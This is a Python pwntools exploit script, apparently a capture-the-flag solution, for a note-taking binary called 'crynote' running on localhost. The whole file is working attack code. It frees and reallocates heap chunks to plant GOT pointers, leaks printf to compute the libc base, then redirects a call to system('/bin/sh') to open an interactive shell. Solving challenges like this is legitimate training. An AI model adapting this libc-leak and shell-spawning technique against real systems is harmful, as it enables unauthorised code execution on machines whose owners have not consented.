from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('crynote')
libc = ELF('libc.so.6')
HOST = 'localhost'
PORT = 21337

p = elf.process()

if args.GDB:
    gdb.attach(p)
elif args.REMOTE:
    p = remote(HOST, PORT)

def create(size, data, key):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendlineafter(b"data: ", data)
    p.sendlineafter(b"key: ", key)

def encrypt(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"index: ", str(idx).encode())

def delete(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())

exit_ptr = 0x4010d0

for i in range(2):
    create(0x20, cyclic(0x10), b'A'*0x18)

delete(0)
delete(1)

create(0x18, p64(elf.sym.cipher) + p64(elf.got.printf) + p32(elf.got.exit), b"\x00")
encrypt(0)

p.recvuntil(b"(hex): ")
leak = p.recvline(0).strip().decode()

libc.address = unpack(xor(bytes.fromhex(leak),p64(exit_ptr).strip(b'\x00')),'all') - libc.sym.printf
info(f"libc base: {hex(libc.address)}")

delete(2)
create(0x18, b'ASDF', p64(libc.sym.system) + p64(libc.search(b"/bin/sh\x00").__next__()))
encrypt(0)

p.interactive()
